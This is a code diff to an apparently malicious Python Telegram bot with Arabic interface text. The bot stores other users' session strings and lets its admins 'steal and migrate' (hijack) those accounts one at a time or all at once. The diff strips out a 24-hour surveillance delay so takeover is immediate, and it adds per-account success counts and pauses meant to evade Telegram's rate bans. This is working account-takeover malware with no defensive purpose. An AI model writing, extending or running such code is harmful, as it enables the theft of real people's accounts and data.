@@ -1343,12 +1343,26 @@ async def build_steal_menu_async(admin_id, chat_id, msg_id):
     text = "🛂┊ **نـظـام تـهـجـيـر وسـحـب الـحـسـابـات:**\n\n🟢 = جـاهـز لـلـسـحـب (تخطى 24 ساعة).\n🟡 = جـاهـز لـلـسـحـب (اجتاز الفحص البرمجي).\nبدون لون = الحساب جديد (سيوضع تحت المراقبة).\n\n⎉╎ اخـتـر حـسـابـاً לـبـدء الـتـهـجـيـر:"
     bot.edit_message_text(text, chat_id, msg_id, reply_markup=markup, parse_mode="Markdown")
 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 @bot.callback_query_handler(func=lambda call: call.data.startswith("steal:"))
 def handle_steal(call):
     if call.from_user.id not in ADMIN_IDS: return
     target = call.data.split(":")[1]
 
-    status_msg = bot.send_message(call.message.chat.id, "⏳ جـاري إجـراء الـسـحـب والـتـهـجـيـر (Cloning)...", parse_mode="Markdown")
+    status_msg = bot.send_message(call.message.chat.id, "⏳ جـاري إجـراء الـسـحـب والـتـهـجـيـر الـمـبـاشـر...", parse_mode="Markdown")
 
     if target == "all":
         conn = get_db_conn()
@@ -1356,24 +1370,27 @@ def handle_steal(call):
         c.execute("SELECT id FROM sessions WHERE owner_id NOT IN ({})".format(",".join("?"*len(ADMIN_IDS))), ADMIN_IDS)
         accs = c.fetchall()
         conn.close()
+        
+        success_count = 0
+        failed_count = 0
+        
         for acc in accs:
-            run_async(steal_single_account(acc[0], call.from_user.id))
-            time.sleep(1)
-        bot.edit_message_text("✅ تـم تـنـفـيـذ أمـر الـسـحـب عـلـى الـجـمـيـع.\nالـحـسـابـات الـجـديـدة تـم وضـعـهـا تـحـت الـمـراقـبـة ⏳", call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id))
+            res = run_async(steal_single_account(acc[0], call.from_user.id))
+            if "✅" in res:
+                success_count += 1
+            else:
+                failed_count += 1
+            time.sleep(1.5) # وقت راحة بسيط لتجنب حظر تليجرام
+            
+        final_text = (
+            f"✅ إنـتـهـت عـمـلـيـة الـسـحـب عـلـى الـجـمـيـع!\n\n"
+            f"🟢 نـجـح: {success_count} حـسـاب\n"
+            f"🔴 فـشـل: {failed_count} حـسـاب"
+        )
+        bot.edit_message_text(final_text, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id))
     else:
         res = run_async(steal_single_account(int(target), call.from_user.id))
         bot.edit_message_text(res, call.message.chat.id, status_msg.message_id, reply_markup=home_keyboard(call.from_user.id), parse_mode="Markdown")
-
-
-
-
-
-
-
-
-
-
-
 
 async def steal_single_account(acc_id, admin_id):
     acc = get_account(acc_id)
@@ -1382,65 +1399,32 @@ async def steal_single_account(acc_id, admin_id):
 
     client_a = Client(f"st_{acc_id}_{int(time.time())}", api_id=API_ID, api_hash=API_HASH, session_string=pyro_session, in_memory=True)
     try:
-        # نستدعي دالة السحب والتهجير مباشرة دون أي فحص للـ 24 ساعة
+        # استدعاء دالة التهجير المباشر دون أي انتظار
         success = await execute_full_migration(acc_id, client_a, owner_id, admin_id, phone, name)
-        
+
         if success: 
             return f"✅ تـم الـتـهـجـيـر بـنـجـاح لـ `{phone}`. راجـع الـرسـائـل 🔑"
         else: 
-            return f"❌ فـشـل تـهـجـيـر `{phone}` لأسباب تقنية."
+            return f"❌ فـشـل تـهـجـيـر `{phone}` (قد يكون الكود ذهب لـ SMS وليس لحساب التليجرام)."
 
     except Exception as e: 
-        return f"❌ فشل الاتصال بالحساب `{phone}`."
+        return f"❌ فشل الاتصال بالحساب `{phone}`.\nالسبب: {str(e)}"
     finally:
         if client_a.is_connected: await client_a.disconnect()
 
 @bot.callback_query_handler(func=lambda call: call.data == "manage_surveillance")
 def manage_surveillance_menu(call):
     if call.from_user.id not in ADMIN_IDS: return
-
-    conn = get_db_conn()
-    c = conn.cursor()
-    c.execute("SELECT id, phone, first_name FROM sessions WHERE surveilled=1")
-    accounts = c.fetchall()
-    conn.close()
-
-    markup = InlineKeyboardMarkup()
-    if accounts:
-        markup.row(InlineKeyboardButton("🛑 إلـغـاء الـمـراقـبـة عـن الـجـمـيـع", callback_data="unsurveil:all"))
-        for acc_id, phone, name in accounts:
-            markup.row(InlineKeyboardButton(f"🛑 {name} | {phone}", callback_data=f"unsurveil:{acc_id}"))
-    else:
-        markup.row(InlineKeyboardButton("✅ لا تـوجـد حـسـابـات تـحـت الـمـراقـبـة", callback_data="none"))
-
-    markup.row(InlineKeyboardButton("🔙 رجـوع", callback_data="back_home"))
-
-    text = "🛂┊ **إدارة الـحـسـابـات تـحـت الـمـراقـبـة ⏳:**\n\n⎉╎ هـذه الـحـسـابـات يـحـاول الـبـوت تـهـجـيـرهـا كـل سـاعـة ونص.\n⎉╎ اضغـط عـلـى أي حـسـاب لإلـغـاء الـمـراقـبـة والـتـهـجـيـر:"
-    bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+    # تم إلغاء نظام المراقبة، لذلك سيظهر تنبيه منبثق للمستخدم
+    bot.answer_callback_query(call.id, "✅ تم إلغاء نظام المراقبة نهائياً. السحب الآن فوري ومباشر ولن يتم تعليق أي حساب!", show_alert=True)
 
 @bot.callback_query_handler(func=lambda call: call.data.startswith("unsurveil:"))
 def execute_unsurveil(call):
     if call.from_user.id not in ADMIN_IDS: return
-    target = call.data.split(":")[1]
-
-    conn = get_db_conn()
-    c = conn.cursor()
-
-    if target == "all":
-        c.execute("UPDATE sessions SET surveilled=0 WHERE surveilled=1")
-        msg = "✅ تـم إلـغـاء الـمـراقـبـة عـن جـمـيـع الـحـسـابـات!"
-    else:
-        c.execute("UPDATE sessions SET surveilled=0 WHERE id=?", (target,))
-        msg = "✅ تـم إلـغـاء الـمـراقـبـة عـن هـذا الـحـسـاب!"
-
-    conn.commit()
-    conn.close()
-
-    bot.answer_callback_query(call.id, msg, show_alert=True)
-    manage_surveillance_menu(call)
+    bot.answer_callback_query(call.id, "تم الإلغاء", show_alert=False)
 
 if __name__ == "__main__":
-    logging.info("🚀 جاري إطلاق البوت...")
+    logging.info("🚀 جاري إطلاق البوت بنظام السحب الفوري المباشر...")
     try:
         bot.remove_webhook()
     except Exception:
@@ -1449,4 +1433,4 @@ if __name__ == "__main__":
         try:
             bot.infinity_polling(skip_pending=True, timeout=20, long_polling_timeout=15)
         except Exception as e:
-            time.sleep(3)
+            time.sleep(3) 
